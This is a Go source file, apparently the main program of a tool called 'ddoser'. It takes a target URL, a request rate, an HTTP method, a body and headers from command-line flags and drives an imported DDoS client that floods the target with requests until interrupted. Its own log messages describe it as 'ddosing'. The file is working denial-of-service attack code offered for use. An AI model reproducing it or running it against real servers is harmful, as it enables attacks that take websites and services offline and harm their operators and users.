package main

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/goodleby/ddoser/client/ddos"
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, os.Kill)
	defer cancel()

	flags, err := ReadFlags()
	if err != nil {
		log.Fatalf("Error reading flags: %v", err)
	}

	ddosClient, err := ddos.NewClient(flags.HTTPTimeout, flags.Retries)
	if err != nil {
		log.Fatalf("Error creating ddos client: %v", err)
	}

	requestGenerator := NewRequestGenerator(flags.URL, flags.Method, bytes.NewBufferString(flags.Body), flags.Headers)

	go func() {
		err = ddosClient.DDoS(ctx, requestGenerator, flags.Rate)
		if err != nil {
			log.Printf("Error ddosing: %v", err)
			cancel()
		}
	}()

	<-ctx.Done()

	log.Println("Stopped ddosing")
}

func NewRequestGenerator(url string, method string, body io.Reader, headers map[string]string) ddos.RequestGenerator {
	return func(ctx context.Context) (*http.Request, error) {
		req, err := http.NewRequestWithContext(
			ctx,
			method,
			url,
			body,
		)
		if err != nil {
			return nil, fmt.Errorf("error creating new request: %v", err)
		}

		for key, value := range headers {
			req.Header.Add(key, value)
		}

		return req, nil
	}
}

type Flags struct {
	URL         string
	Rate        int
	Method      string
	Body        string
	Headers     Headers
	Retries     int
	HTTPTimeout time.Duration
}

func (f *Flags) Validate() error {
	if f.URL == "" {
		return fmt.Errorf("missing required url flag")
	}
	if f.Rate == 0 {
		return fmt.Errorf("missing required rate flag")
	}

	return nil
}

func ReadFlags() (*Flags, error) {
	var flags Flags

	flag.StringVar(&flags.URL, "url", "", "Target URL to make requests to.")
	flag.IntVar(&flags.Rate, "rate", 0, "Amount of requests per second.")
	flag.StringVar(&flags.Method, "method", http.MethodGet, "HTTP method to use.")
	flag.StringVar(&flags.Body, "body", "", "Body to send with the request.")
	flag.Var(&flags.Headers, "header", "Header to send with the request.")
	flag.IntVar(&flags.Retries, "retries", 3, "Retries before giving up.")
	flag.DurationVar(&flags.HTTPTimeout, "http-timeout", 5*time.Minute, "HTTP client timeout.")

	flag.Parse()

	err := flags.Validate()
	if err != nil {
		return nil, fmt.Errorf("error: invalid flags: %v", err)
	}

	return &flags, nil
}

type Headers map[string]string

func (h *Headers) String() string {
	return fmt.Sprintf("%v", *h)
}

func (h *Headers) Set(header string) error {
	if *h == nil {
		*h = make(map[string]string)
	}

	pair := strings.Split(header, ":")
	if len(pair) != 2 || pair[0] == "" || pair[1] == "" {
		return fmt.Errorf("invalid header format: %s", header)
	}

	key := strings.TrimSpace(pair[0])
	value := strings.TrimSpace(pair[1])

	(*h)[key] = value

	return nil
}
